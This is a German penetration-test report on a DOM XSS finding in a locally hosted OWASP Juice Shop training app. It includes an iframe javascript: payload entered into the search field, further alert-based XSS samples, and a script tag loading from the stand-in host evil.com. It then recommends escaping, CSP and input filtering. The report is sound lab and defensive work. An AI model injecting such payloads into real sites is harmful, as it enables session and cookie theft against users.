# Penetration Test Bericht – DOM XSS

## 1. Ziel  
Im Rahmen dieses Pentest´s im OWASP Juice Shop war das Ziel, eigene´s geschriebenen Schadcode in die Application hinzuzufügen. Um Code auszuführen, was nicht in der App vorhanden war. Die Aufgabe bestand darin, schadcode auszuführen, indem man javascript code in die Suchfelder oder ähnl. inputfelder hinzuzufügen

---

## 2. Scope (Testumfang)  
- **Zielsystem:** OWASP Juice Shop – lokal gehostet  
- **Testmethode:** Black-Box  
- **Testzeitraum:** 02.06.2025 
- **Tools:** DevTools

---

## 3. Vorgehensweise  
1. Navigieren zur Website Owasp Juice Shop. In unserm Fall `http://127.0.0.1:3000/#/`.
2. Klicke auf die suchleiste und gebe diesen potenziellen Schadcode ein `<iframe src="javascript:alert(`hacked`)">`
3. Jetzt wird der Schadcode ausgeführt. In unserm Fall war es nur ein Alert

---

## 4. Gefundene Schwachstelle(n)
- Da die eingabe im Suchfeld ungefilter ausgeführt wird kann Fremdcode ohne probleme hinzugegeben werden.

- Die Website kann nach belieben manipuliert werden

---

## 5. Risikoanalyse / Auswirkung:
- Cookies stehlen (z. B. um dich einzuloggen als wär er du)
- Session übernehmen
- Tastatureingaben mitlesen
- Dich auf andere Seiten umleiten
- Schadcode nachladen

---

## 6. Empfehlung  
- Frameworks nutzen, die automatisch XSS verhindern (z.B. React, Angular)
- Escape von HTML-Inhalten, bevor sie im DOM eingefügt werden.
- Content Security Policy (CSP) einrichten 
Beispiel:
``` bash
Content-Security-Policy: default-src 'self'; script-src 'self'
```
verhindert den Browser automatisch, dass z. B. ein `<script src="http://evil.com/x.js">` überhaupt geladen wird.
- Filter/Validierung einbauen, womit Usereingaben auf sonderzeichen, script tags u.ä. geprüft werden, ob es sich dabei um fremdcode handelt der nach der Eingabe ausgeführt wird oder nicht.
``` bash
<>/script
<script>alert('Hacked!');</script>
oder
<iframe src="javascript:alert(xss)">
```

---

## 7. Fazit  
Dieser test zeigt, wie einfach man fremdcode zu einer x beliebigen Website oder Applikation hinzufügen kann, wenn die Inputfelder nicht gefiltert werden. Ein realer Angreifer könnte somit X beliebigen Code ausführen lassen und Angriffe wie Session-Diebstahl, Phishing oder Inhalte Manipulieren.

---

